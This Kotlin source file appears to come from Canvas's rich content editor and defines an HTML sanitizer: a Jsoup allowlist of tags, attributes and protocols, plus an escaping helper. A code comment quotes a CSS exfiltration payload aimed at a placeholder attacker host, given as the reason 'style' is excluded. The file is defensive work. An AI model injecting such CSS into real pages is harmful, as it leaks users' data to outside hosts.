/*
 * Copyright (C) 2026 - present Instructure, Inc.
 *
 *     Licensed under the Apache License, Version 2.0 (the "License");
 *     you may not use this file except in compliance with the License.
 *     You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 */
package instructure.rceditor

import org.jsoup.Jsoup
import org.jsoup.nodes.Entities
import org.jsoup.safety.Safelist

/**
 * HTML sanitization utilities used to honor RFC layers L1 (RCE-output sanitization before POST)
 * and L4 (render-time escaping of plain-text fields spliced into HTML).
 *
 * The allowlist mirrors the shape of the web client's `CanvasSanitize::SANITIZE` so that content
 * surviving the client sanitizer would also survive the server sanitizer.
 */
object HtmlSanitizer {

    private val safelist: Safelist = Safelist.relaxed()
        .addTags(
            "iframe", "video", "audio", "source", "track",
            "math", "annotation", "annotation-xml", "semantics",
            "mrow", "mi", "mn", "mo", "msup", "msub", "mfrac",
            "mtable", "mtr", "mtd", "msqrt"
        )
        // NOTE: `style` is intentionally NOT allow-listed. Jsoup does not sanitize CSS contents,
        // so a `style` attribute that survives the server's CSS sanitizer but reaches us via an
        // L1 bypass (direct API POST) could ship `background:url(https://attacker/?leak)`,
        // `position:fixed`-based clickjacking overlays, or other CSS side channels. If/when a
        // CSS allowlist is added, `style` can be re-introduced here.
        .addAttributes(
            ":all",
            "class", "id", "lang", "dir",
            "title", "role", "aria-label", "aria-hidden"
        )
        .addAttributes(
            "iframe",
            "src", "width", "height", "allowfullscreen",
            "frameborder", "scrolling", "loading", "sandbox"
        )
        .addAttributes("img", "src", "srcset", "alt", "width", "height", "loading")
        .addAttributes("video", "src", "controls", "autoplay", "loop", "muted", "poster")
        .addAttributes("source", "src", "type", "srcset", "media")
        .addAttributes("track", "src", "kind", "label", "srclang", "default")
        .addAttributes("a", "href", "rel", "target", "name")
        .addProtocols("a", "href", "http", "https", "mailto", "tel")
        .addProtocols("img", "src", "http", "https", "data")
        .addProtocols("iframe", "src", "http", "https")
        .preserveRelativeLinks(true)

    /**
     * Sanitize an HTML string for sending back to the server (Layer 1 in the RFC).
     * Strips script/event-handler/dangerous-scheme content while preserving structural HTML
     * the server would also accept.
     */
    fun sanitize(html: String?): String =
        if (html.isNullOrEmpty()) "" else Jsoup.clean(html, safelist)

    /**
     * HTML-escape a plain-text value before splicing it into an HTML context (Layer 4 in the RFC).
     * Use this when interpolating titles, names, or other plain-text fields that the server does not
     * sanitize — the escaping responsibility lives at the render site.
     */
    fun escapeForHtmlContext(text: String?): String =
        Entities.escape(text ?: "")
}
